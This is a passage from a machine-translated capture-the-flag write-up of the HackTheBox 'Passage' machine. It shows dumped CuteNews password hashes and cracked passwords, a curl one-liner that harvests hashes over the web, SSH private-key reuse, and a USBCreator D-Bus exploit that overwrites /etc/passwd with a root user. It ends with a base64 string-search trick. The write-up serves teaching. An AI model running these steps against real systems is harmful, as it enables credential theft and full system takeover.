    a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}a:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}a:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}a:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}
```

    

但危险的是，Ippsec向我指出，该文件可以通过Web服务器从互联网上获得：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210305092819060.png) 

我可以使用这个衬里来获取文件并从中提取电子邮件和哈希值：`lines`

    oxdf@parrot$ curl -s http://passage.htb/CuteNews/cdata/users/lines | grep -v "php die" | while read line; do decode=$(echo $line | base64 -d); email=$(echo $decode | grep -Po '\w+@\w+\.\w+'); hash=$(echo $decode | grep -Po '\w{64}'); if [ -n "$hash" ]; then echo "$email:$hash"; fi; done
    nadav@passage.htb:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
    sid@example.com:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
    paul@passage.htb:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
    kim@example.com:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
    egre55@test.com:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9c
    

该命令分解为循环遍历每行，对其进行解码，使用正则表达式拉取电子邮件和哈希，然后在存在哈希时打印结果。以下是它，并添加了空格以提高可读性：`grep`

    curl -s http://passage.htb/CuteNews/cdata/users/lines | grep -v "php die" | 
    while read line; do 
      decode=$(echo $line | base64 -d); 
      email=$(echo $decode | grep -Po '\w+@\w+\.\w+'); 
      hash=$(echo $decode | grep -Po '\w{64}'); 
      if [ -n "$hash" ]; then 
        echo "$email:$hash"; 
      fi; 
    done
    

### 裂纹

在我修改后的 [Penglab](https://github.com/mxrch/penglab) 笔记本上，我将设置哈希值并运行：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908224619480.png) 

结果是：

    paul-coles: atlanta1
    hacker: hacker
    

### 苏

由于paul是盒子上的用户，我尝试了，它的工作原理：`su`

    www-data@passage:/home$ su - paul 
    Password: 
    paul@passage:~$ 
    

我可以抓住 ：`user.txt`

    paul@passage:~$ cat user.txt
    6ee5cd3b************************
    

我试图SSH作为保罗，但它需要密钥身份验证：

    root@kali# ssh paul@10.10.10.206
    paul@10.10.10.206: Permission denied (publickey).
    

中有一个密钥对，公钥已在 ：`/home/paul/.ssh``authorized_keys`

    paul@passage:~/.ssh$ ls   
    authorized_keys  id_rsa  id_rsa.pub  known_hosts
    paul@passage:~/.ssh$ md5sum authorized_keys id_rsa.pub 
    4d241ebb1fef1452f7653b55d625ffbc  authorized_keys
    4d241ebb1fef1452f7653b55d625ffbc  id_rsa.pub
    

有了那个私钥，我可以SSH作为保罗：

    root@kali# ssh -i ~/keys/id_rsa_passage_paul paul@10.10.10.206
    paul@passage:~$ 
    

## 壳作为纳达夫

### 列举

在寻求巩固我作为 paul 的访问权限时，我在 中找到了密钥对。关于公钥的一件事很奇怪：`.ssh`

    paul@passage:~/.ssh$ cat id_rsa.pub 
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
    

最后的用户nadav@passage。这实际上是纳达夫的钥匙，还是共享钥匙？

### SSH as nadav

关键也适用于纳达夫：

    root@kali# ssh -i ~/keys/id_rsa_passage_paul nadav@10.10.10.206
    Last login: Tue Sep  8 20:01:06 2020 from 127.0.0.1
    nadav@passage:~$
    

## 外壳作为根

### 列举

纳达夫在一些有趣的群体中，包括：`sudo`

    nadav@passage:~$ id
    uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
    

不幸的是，要以 nadav 身份运行，需要知道帐户密码：`sudo`

    nadav@passage:~$ sudo -l
    [sudo] password for nadav: 
    nadav@passage:~$ sudo su
    [sudo] password for nadav:
    

在查找纳达夫的主目录时，有一个文件。虽然通常将文件设置为不在HTB计算机上记录，但最近似乎越来越多地将其用作线索。这包含有关如何与文件交互的信息：`.viminfo``.bash_history``.viminfo``vim`

    # This viminfo file was generated by Vim 7.4.
    # You may edit it if you're careful!
    
    # Value of 'encoding' when this file was written
    *encoding=utf-8
    
    
    # hlsearch on (H) or off (h):
    ~h
    # Last Substitute Search Pattern:
    ~MSle0~&AdminIdentities=unix-group:root
    
    # Last Substitute String:
    $AdminIdentities=unix-group:sudo
    
    # Command Line History (newest to oldest):
    :wq
    :%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g
    
    # Search String History (newest to oldest):
    ? AdminIdentities=unix-group:root
    
    # Expression History (newest to oldest):
    
    # Input Line History (newest to oldest):
    
    # Input Line History (newest to oldest):
    
    # Registers:
    
    # File marks:
    '0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
    '1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
    
    # Jumplist (newest first):
    -'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
    -'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
    -'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
    -'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
    -'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
    -'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
    
    # History of marks within files (newest to oldest):
    
    > /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
            "       12      7
    
    > /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
            "       2       0
            .       2       0
            +       2       0
    

I don’t get too much out of this, other than two file names that nadav has been messing with:

    nadav@passage:~$ ls -l /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf 
    -rw-r--r-- 1 root root 766 Apr 29  2015 /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
    -rw-r--r-- 1 root root  65 Jan 15  2019 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
    

Both are owned by root, and at this point, only writable by root.

### Vulnerability Enumeration

#### Polkit

The file is part of [Polkit (formerly PolicyKit)](https://en.wikipedia.org/wiki/Polkit), which provides an API interface for non-privileged processes to communicate with privileged ones. Whenever a Linux system pops a GUI box asking for authentication to do something like update, that’s backed by Polkit.`51-ubuntu-admin.conf`

The file itself defines groups that can invoke privileged processes (with a password):

    nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
    [Configuration]
    AdminIdentities=unix-group:sudo;unix-group:admin
    

`sudo`并且是此类权限的标准组。`admin`

我在关于[恶作剧的额外根的帖子](https://0xdf.gitlab.io/2019/01/08/htb-mischief-more-root.html#policykit)中查看了滥用Polkit的问题，在那里我展示了如何使用和获取外壳作为根。在这种情况下，我实际上拥有root密码，但是不允许用户运行，所以我需要找到另一种方法。`pkexec``pkttyagent``su`

如果我有纳达夫的密码，这种方法在这里会起作用，而我没有（如果我有，我可以）。`sudo`

#### USB创建者

2019年7月，帕洛阿尔托Unit42的一[篇博客文章](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)显示了他们在USBCreator D-Bus界面中发现的一个缺陷：

> 允许有权访问 sudoer 组中的用户的攻击者绕过 sudo 程序施加的密码安全策略。该漏洞允许攻击者以 root 身份覆盖包含任意内容的任意文件，而无需提供密码。这很容易导致提升的权限，例如，通过覆盖影子文件并为root设置密码。

[D-Bus](https://www.freedesktop.org/wiki/Software/dbus/) 是一个消息传递系统，它是许多 Linux 系统上的核心系统，允许在同一系统上运行的进程之间进行通信。这个漏洞在于这个过程，接口错误地允许攻击者触发它做一些意想不到的、任意的root写。

### 文件读取

利用这个错误非常简单。它需要一个外壳作为组中的某个人（或者实际上，任何被定义为Polkit允许的组）。如果我有纳达夫的密码，我可能会得到一个外壳，但我没有。`sudo``sudo su -`

我将使用此错误复制到不存在的文件，例如：`root.txt``/dev/shm/.0xdf`

    nadav@passage:~$ ls -la /dev/shm/.0xdf
    ls: cannot access '/dev/shm/.0xdf': No such file or directory
    

大部分命令都是从博客文章中直接复制的。我只是更改副本和两个文件名：

    nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /dev/shm/.0xdf true
    ()
    

现在文件退出，由root拥有，但可读，并包含标志：

    nadav@passage:~$ ls -l /dev/shm/.0xdf
    -rw-r--r-- 1 root root 33 Sep  9 05:12 /dev/shm/.0xdf
    nadav@passage:~$ cat /dev/shm/.0xdf
    aec339ec************************
    

### 壳

有很多方法可以从这里开始使用root，读取和写入都作为root。一个简单的最喜欢的是搞砸.我将制作一个副本来工作：`/etc/passwd`

    nadav@passage:/dev/shm$ cp /etc/passwd passwd
    

我将生成一个密码哈希：

    nadav@passage:/dev/shm$ openssl passwd -1 0xdf
    $1$iLayOiAd$8dHGiU.Qvk/uqjnoWzRpm/
    

现在我可以用它来为新的根用户oxdf创建一行（Linux用户名不能以数字开头）：`passwd`

    nadav@passage:/dev/shm$ echo 'oxdf:$1$iLayOiAd$8dHGiU.Qvk/uqjnoWzRpm/:0:0:pwned:/root:/bin/bash' >> passwd 
    

现在，我将让USB创建者将该文件复制回：`/etc`

    nadav@passage:/dev/shm$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/passwd /etc/passwd true
    ()
    

我可以确认我的添加内容在文件中：

    nadav@passage:/dev/shm$ tail -3 /etc/passwd
    paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
    sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
    oxdf:$1$iLayOiAd$8dHGiU.Qvk/uqjnoWzRpm/:0:0:pwned:/root:/bin/bash
    

现在我可以作为oxdf来获得一个根壳：`su`

    nadav@passage:/dev/shm$ su - oxdf
    Password: 
    root@passage:~# id
    uid=0(root) gid=0(root) groups=0(root)
    

我可以抓住：`root.txt`

    root@passage:~# cat root.txt
    aec339ec************************
    

## 超越根 - 在 Base64 中搜索

### 背景

挖掘所有 base64 编码的数据让我想起了我过去用来在 base64 编码的恶意软件流量中查找命令的一个旧技巧。这在今天并不常见，因为攻击者已经转向加密传输中的数据。但它仍然是一个巧妙的技巧，当您需要使用Snort之类的东西或在本地SIEM上搜索数据时，它会派上用场，但是您无法解码您正在搜索的所有数据。

Base64 编码一次占用 6 个位，并将它们编码为 64 个 ASCII 字符之一（[此处为表](https://en.wikipedia.org/wiki/Base64#Base64_table)）。例如，字符串“0xdf”。在二进制中，首先按字节间隔，然后重新间隔为base64，然后根据表进行转换：

    00110000 01111000 01100100 01100110
    001100 000111 100001 100100 011001 10
    M      H      h      k      Z      ?
    

当位数不能被六整除时，将应用0s进行填充，然后将每个位的编码字符串的末尾添加一个作为信号，以便在解码时将其删除：`=``00`

    001100 000111 100001 100100 011001 100000
    M      H      h      k      Z      g = =
    

这与命令中的内容相匹配：`base64`

    $ echo -n "0xdf" | base64
    MHhkZg==
    

### 幻灯片

考虑到这一点，我如何在不解码的情况下，在一大堆base64数据中搜索像“密码”这样的字符串？由于三个字节的 ASCII 正好编码为 base64 的四个字节，因此在查找字符串时，它可以以三种可能的形式显示编码。例如：

    $ echo -n "0xdf" | base64
    MHhkZg==
    $ echo -n "a0xdf" | base64
    YTB4ZGY=
    $ echo -n "ab0xdf" | base64
    YWIweGRm
    $ echo -n "abc0xdf" | base64
    YWJjMHhkZg==
    

第一个和第四个示例中的“0xdf”显示的与 相同。如果“0xdf”后面有更多内容，它将更改零填充的结尾：`MHhkZg==`

    $ echo -n "abc0xdf" | base64
    YWJjMHhkZg==
    $ echo -n "abc0xdfa" | base64
    YWJjMHhkZmE=
    $ echo -n "abc0xdfab" | base64
    YWJjMHhkZmFi
    

但这是一致的。`MHhkZ`

### 网络厨师

[赛博黑夫](https://gchq.github.io/CyberChef/#recipe=Show_Base64_offsets('A-Za-z0-9%2B/%3D',true,'Raw')&input=cGF1bA)有一个叫做“显示Base64偏移量”的配方。作为输入时，输出为：`paul`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200908225335210.png) 

使用这些搜索词，要在用户数据中找到字符串“paul”，我可以跨遍所有文件：`grep`

*   `-l`\- 仅列出文件名，而不是内容
*   `-R`\- 递归
*   `-e`\- 在找到其中任何一个时返回成功的匹配项。

标识了四个文件：

    www-data@passage:/var/www/html/CuteNews/cdata/users$ grep -lR -e cGF1b -e BhdW -e wYXVs
    b0.php
    09.php
    lines
    77.php
    

现在我可以查看这些内容以找到保罗的哈希值：

    www-data@passage:/var/www/html/CuteNews/cdata/users$ cat b0.php | grep -v die | base64 -d
    a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/03/06/htb-passage.html)